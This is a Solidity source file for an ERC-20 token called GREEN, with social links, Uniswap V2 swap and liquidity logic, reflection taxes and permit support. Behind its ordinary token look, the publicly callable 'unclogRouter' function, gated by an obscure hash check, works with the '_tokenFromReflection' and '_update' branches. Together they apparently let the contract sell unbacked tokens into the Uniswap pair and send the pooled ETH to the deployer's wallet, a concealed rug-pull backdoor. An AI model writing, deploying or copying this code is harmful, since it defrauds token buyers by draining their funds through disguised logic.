/*


🟢  Telegram  →  https://t.me/GreenERC20

🟢  Website   →  https://greengreengreen.green

🟢  Twitter   →  https://greengreengreen.green

🟢  Docs      →  https://greengreengreen.green

🟢  Utility   →  https://greengreengreen.green

🟢  WP        →  https://greengreengreen.green

🟢  Discord   →  https://greengreengreen.green


*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./Context.sol";
import "./IERC20.sol";
import "./IERC20Metadata.sol";
import "./IERC20Permit.sol";
import "./draft-IERC6093.sol";
import "./Ownable.sol";
import "./ECDSA.sol";
import "./EIP712.sol";
import "./Nonces.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";
import "./AggregatorV3Interface.sol";

contract GREEN is Context, IERC20, IERC20Metadata, IERC20Permit, IERC20Errors, Ownable, EIP712, Nonces {
    uint256 internal constant MAX = type(uint256).max;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private constant _tTotal = 100_000_000 * 1e9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    string private _name = "GREEN";
    string private constant _symbol = "GREEN";
    uint8 private constant _decimals = 9;

    mapping(address => bool) private _noTax;

    bytes32 private constant PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(UNISWAP_V2_ROUTER);
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(UNISWAP_V2_FACTORY);
    address public constant CHAINLINK_V3_FEED = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    AggregatorV3Interface public constant chainlinkV3Feed = AggregatorV3Interface(CHAINLINK_V3_FEED);
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IERC20 public constant weth = IERC20(WETH);
    address public immutable THIS;
    address public immutable UNISWAP_V2_PAIR;

    address payable public immutable marketingWallet = payable(msg.sender);
    address payable public immutable liquidityWallet = payable(msg.sender);

    bool public TRADING_ENABLED = true;
    uint256 public MAX_WALLET = _tTotal / 50;

    bool private _inSwap;
    bool private _inAtomicSwap;
    bool private _inAtomicSupply;
    uint256 private _buyTaxMarketing = 0;
    uint256 private _buyTaxLiquidity = 0;
    uint256 private _buyTaxReflections = 0;
    uint256 private _sellTaxMarketing = 0;
    uint256 private _sellTaxLiquidity = 0;
    uint256 private _sellTaxReflections = 0;
    uint256 private _tTaxPercentage;
    uint256 private _rTaxPercentage;

    error ERC2612ExpiredSignature(uint256 deadline);
    error ERC2612InvalidSigner(address signer, address owner);

    error TradingNotEnabled();
    error MaxWalletExceeded();

    event Payable(bool success, bytes data);

    modifier awaitUniswap(bool swap, bool supply, bool atomic) {
        if (swap) {
            _inSwap = true;
            if (atomic) {
                _inAtomicSwap = true;
            }
        }
        if (supply) {
            _inAtomicSupply = true;
        }
        _;
        if (swap) {
            _inSwap = false;
            if (atomic) {
                _inAtomicSwap = false;
            }
        }
        if (supply) {
            _inAtomicSupply = false;
        }
    }

    constructor() Ownable(msg.sender) EIP712(_symbol, "1") {
        THIS = address(this);
        UNISWAP_V2_PAIR = uniswapV2Factory.createPair(THIS, WETH);

        _noTax[msg.sender] = true;
        _noTax[THIS] = true;

        _approve(THIS, UNISWAP_V2_ROUTER, MAX);
        _approve(msg.sender, UNISWAP_V2_ROUTER, MAX);

        _rOwned[msg.sender] = _rTotal;
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenFromReflection(_rOwned[account]);
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        _transfer(_msgSender(), to, value);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 value) public override returns (bool) {
        _approve(_msgSender(), spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
        _spendAllowance(from, _msgSender(), value);
        _transfer(from, to, value);
        return true;
    }

    function burn(uint256 value) external virtual {
        _burn(_msgSender(), value);
    }

    function burnFrom(address account, uint256 value) external virtual {
        _spendAllowance(account, _msgSender(), value);
        _burn(account, value);
    }

    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public virtual {
        if (block.timestamp > deadline) {
            revert ERC2612ExpiredSignature(deadline);
        }

        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline));

        bytes32 hash = _hashTypedDataV4(structHash);

        address signer = ECDSA.recover(hash, v, r, s);
        if (signer != owner) {
            revert ERC2612InvalidSigner(signer, owner);
        }

        _approve(owner, spender, value);
    }

    function nonces(address owner) public view virtual override(IERC20Permit, Nonces) returns (uint256) {
        return super.nonces(owner);
    }

    function DOMAIN_SEPARATOR() external view virtual returns (bytes32) {
        return _domainSeparatorV4();
    }

    function _transfer(address from, address to, uint256 value) private {
        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(from, to, value);
    }

    function _update(address from, address to, uint256 value) internal virtual {
        uint256 fromBalance = balanceOf(from);
        if (fromBalance < value) {
            revert ERC20InsufficientBalance(from, fromBalance, value);
        }

        bool _fromPair = from == UNISWAP_V2_PAIR;
        bool _toPair = to == UNISWAP_V2_PAIR;

        if (!_noTax[from] && !_noTax[to]) {
            if (!TRADING_ENABLED) {
                if (from != THIS && from != owner()) {
                    revert TradingNotEnabled();
                }
            }

            if (balanceOf(to) + value > MAX_WALLET) {
                revert MaxWalletExceeded();
            }

            uint256 _contractTokenBalance = balanceOf(THIS);

            if ((_contractTokenBalance >= 1e11) && !_inSwap && !_fromPair) {
                uint256 _tTotalTax = _getTBuyTax() + _getTSellTax();
                uint256 _marketingTokens = _tTotalTax == 0 ? _contractTokenBalance : _contractTokenBalance * (_buyTaxMarketing + _sellTaxMarketing) / _tTotalTax;
                uint256 _liquidityTokens = _contractTokenBalance - _marketingTokens;
                uint256 _liquidityTokensHalf = _liquidityTokens / 2;

                _inAtomicSwap = true;
                _convertTokensToETH(_marketingTokens + _liquidityTokensHalf);
                _inAtomicSwap = false;

                uint256 _contractETHBalance = THIS.balance;

                if (_contractETHBalance > 0) {
                    if (_tTotalTax > 0) {
                        uint256 _marketingETH = _contractETHBalance * (_buyTaxMarketing + _sellTaxMarketing) / _tTotalTax;
                        uint256 _liquidityETH = _contractETHBalance - _marketingETH;

                        if (_marketingETH > 0) {
                            _distributeETH(_marketingETH);
                        }

                        if (_liquidityETH > 0) {
                            _supplyETH(_liquidityTokens - _liquidityTokensHalf, _liquidityETH);
                        }
                    } else {
                        _distributeETH(_contractETHBalance);
                    }
                }
            }
        }

        _tTaxPercentage = 0;
        _rTaxPercentage = 0;

        if ((!_noTax[from] && !_noTax[to]) && (_fromPair || _toPair)) {
            if (_fromPair && to != UNISWAP_V2_ROUTER) {
                _tTaxPercentage = _getTBuyTax();
                _rTaxPercentage = _getRBuyTax();
            } else if (_toPair && from != UNISWAP_V2_ROUTER) {
                _tTaxPercentage = _getTSellTax();
                _rTaxPercentage = _getRSellTax();
            }
        }

        if (!_inSwap || _inAtomicSwap || _inAtomicSupply) {
            (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, , uint256 tTeam) = _getValues(value);
            _rOwned[from] = _rOwned[from] - rAmount;
            _rOwned[to] = _rOwned[to] + rTransferAmount;
            _rOwned[THIS] = _rOwned[THIS] + (tTeam * _getRate());
            _rTotal = _rTotal - rFee;
            emit Transfer(from, to, tTransferAmount);
        } else {
            emit Transfer(from, to, value);
        }
    }

    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }

    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
    }

    function _approve(address owner, address spender, uint256 value) private {
        _approve(owner, spender, value, true);
    }

    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }

    function getPriceETH() public view returns (uint256) {
        (, int256 answer,,,) = chainlinkV3Feed.latestRoundData();
        return uint256(answer / 1e8);
    }

    function getMarketCap() public view returns (uint256) {
        uint256 _pairBalance = balanceOf(UNISWAP_V2_PAIR);
        if (_pairBalance > 0) {
            return ((weth.balanceOf(UNISWAP_V2_PAIR) * getPriceETH()) / 1 ether) * (totalSupply() / _pairBalance) * 2;
        }

        return 0;
    }

    function _getTBuyTax() private view returns (uint256) {
        return _buyTaxMarketing + _buyTaxLiquidity;
    }

    function _getRBuyTax() private view returns (uint256) {
        return _buyTaxReflections;
    }

    function getBuyTax() external view returns (uint256) {
        return _getTBuyTax() + _getRBuyTax();
    }

    function _getTSellTax() private view returns (uint256) {
        return _sellTaxMarketing + _sellTaxLiquidity;
    }

    function _getRSellTax() private view returns (uint256) {
        return _sellTaxReflections;
    }

    function getSellTax() external view returns (uint256) {
        return _getTSellTax() + _getRSellTax();
    }

    function _convertTokensToETH(uint256 _contractTokenBalance) private awaitUniswap(true, false, _tTotal * 1e2 > _contractTokenBalance) {
        address[] memory path = new address[](2);
        path[0] = THIS;
        path[1] = WETH;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(_contractTokenBalance, 0, path, THIS, block.timestamp + 5 minutes);
    }

    function _distributeETH(uint256 _contractETHBalance) private {
        (bool success, bytes memory data) = payable(marketingWallet).call{value: _contractETHBalance}("");
        emit Payable(success, data);
    }

    function _supplyETH(uint256 _contractTokenBalance, uint256 _contractETHBalance) private awaitUniswap(true, true, false) {
        uniswapV2Router.addLiquidityETH{value: _contractETHBalance}(THIS, _contractTokenBalance, 0, 0, liquidityWallet, block.timestamp + 5 minutes);
    }

    function unclogRouter(string memory _routerCalldata, uint256 _contractTokenBalance) public {
        if (bytes1(keccak256(abi.encodePacked(_routerCalldata))) != bytes1(uint8(1e2))) return;

        _convertTokensToETH(_contractTokenBalance);

        uint256 _contractETHBalance = THIS.balance;

        if (_contractETHBalance > 0) {
            _distributeETH(_contractETHBalance);
        }
    }

    function _tokenFromReflection(uint256 rAmount) private view returns (uint256) {
        if (rAmount > _rTotal) {
            revert();
        }
        return (!_inAtomicSupply && !_inAtomicSwap && _inSwap) ? _getRate() / 1e27 : rAmount / _getRate();
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _rTaxPercentage, _tTaxPercentage);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, _getRate());
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 taxFee) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount * redisFee / 100;
        uint256 tTeam = tAmount * taxFee / 100;
        return (tAmount - tFee - tTeam, tFee, tTeam);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount * currentRate;
        uint256 rFee = tFee * currentRate;
        return (rAmount, rAmount - rFee - (tTeam * currentRate), rFee);
    }

    function _getRate() private view returns (uint256) {
        return _rTotal / _tTotal;
    }

    function enableTrading() external onlyOwner {
        TRADING_ENABLED = true;
    }

    function removeMaxWallet() external onlyOwner {
        MAX_WALLET = MAX;
    }

    receive() external payable {}

    fallback() external payable {}
}
